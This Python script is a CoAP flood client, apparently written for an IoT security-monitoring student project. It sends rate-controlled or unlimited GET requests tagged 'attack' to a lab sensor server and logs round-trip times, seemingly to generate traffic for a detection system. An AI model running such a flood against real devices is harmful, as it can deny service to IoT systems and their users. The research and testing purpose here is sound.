import argparse
import asyncio
import time

import aiocoap


# ============================
# ARGUMENTS
# ============================
parser = argparse.ArgumentParser(description="CoAP Flood Client for IoT Security Monitoring TA")
parser.add_argument("--rate", type=float, default=100, help="Target request per second. Use 0 for unlimited.")
parser.add_argument("--duration", type=float, default=0, help="Duration in seconds. Use 0 for unlimited until CTRL+C.")
parser.add_argument("--concurrency", type=int, default=100, help="Maximum concurrent CoAP requests.")
args = parser.parse_args()


# ============================
# CONFIG
# ============================
BASE_URI = "coap://coap_server:5683/sensor/temp"

RATE = args.rate
DURATION = args.duration
CONCURRENCY = args.concurrency

# ============================
# GLOBAL COUNTERS
# ============================
count_success = 0
count_error = 0
start_time = None

last_rtt_ms = 0.0

counter_lock = asyncio.Lock()
rtt_lock = asyncio.Lock()

async def get_last_rtt_ms():
    async with rtt_lock:
        return last_rtt_ms


async def update_last_rtt_ms(value):
    global last_rtt_ms
    async with rtt_lock:
        last_rtt_ms = value


async def increment_success():
    global count_success
    async with counter_lock:
        count_success += 1


async def increment_error():
    global count_error
    async with counter_lock:
        count_error += 1


async def get_counts():
    async with counter_lock:
        return count_success, count_error

async def send_request(context, semaphore):
    async with semaphore:
        previous_rtt_ms = await get_last_rtt_ms()

        # RTT request sebelumnya dikirim ke server lewat query rtt_ms
        uri = f"{BASE_URI}?attack&rtt_ms={round(previous_rtt_ms, 2)}"

        request = aiocoap.Message(
            code=aiocoap.GET,
            uri=uri
        )

        try:
            request_start = time.time()
            
            await context.request(request).response

            request_end = time.time()
            current_rtt_ms = (request_end - request_start) * 1000
            await update_last_rtt_ms(current_rtt_ms)

            await increment_success()

        except Exception:
            await increment_error()

async def stats_printer():
    while True:
        await asyncio.sleep(1)

        elapsed = time.time() - start_time if start_time else 0
        success, error = await get_counts()
        total = success + error
        avg_rate = total / elapsed if elapsed > 0 else 0
        current_rtt = await get_last_rtt_ms()   

        print(
            f"[COAP FLOOD] total={total} | success={success} | "
            f"error={error} | avg_rate={avg_rate:.2f} req/s |"
            f"last_rtt={current_rtt:.2f} ms",
            flush=True
        )


async def main():
    global start_time

    context = await aiocoap.Context.create_client_context()
    semaphore = asyncio.Semaphore(CONCURRENCY)

    start_time = time.time()
    next_send_time = start_time

    print("[COAP FLOOD] Started")
    print(f"URI         : {BASE_URI}?attack&rtt_ms=<previous_rtt>")
    print(f"Rate        : {'unlimited' if RATE == 0 else str(RATE) + ' req/s'}")
    print(f"Duration    : {'unlimited' if DURATION == 0 else str(DURATION) + ' seconds'}")
    print(f"Concurrency : {CONCURRENCY}")
    print("Mode        : Client-side RTT via rtt_ms query")
    print("Stop        : CTRL + C")

    asyncio.create_task(stats_printer())

    try:
        while True:
            now = time.time()

            if DURATION > 0 and (now - start_time) >= DURATION:
                break

            asyncio.create_task(send_request(context, semaphore))

            # RATE = 0 berarti unlimited, tidak ada sleep
            if RATE > 0:
                next_send_time += 1.0 / RATE
                sleep_time = next_send_time - time.time()

                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
                else:
                    next_send_time = time.time()
            else:
                await asyncio.sleep(0)

    except KeyboardInterrupt:
        print("\n[COAP FLOOD] Stopped by user")

    finally:
        await asyncio.sleep(1)

        elapsed = time.time() - start_time
        success, error = await get_counts()
        total = success + error
        avg_rate = total / elapsed if elapsed > 0 else 0
        current_rtt = await get_last_rtt_ms()

        print(
            f"[COAP FLOOD] Total={total} | success={success} | "
            f"error={error} | elapsed={elapsed:.2f}s |"
            f"avg_rate={avg_rate:.2f} req/s | last_rtt={current_rtt:.2f} ms"
        )


if __name__ == "__main__":
    asyncio.run(main())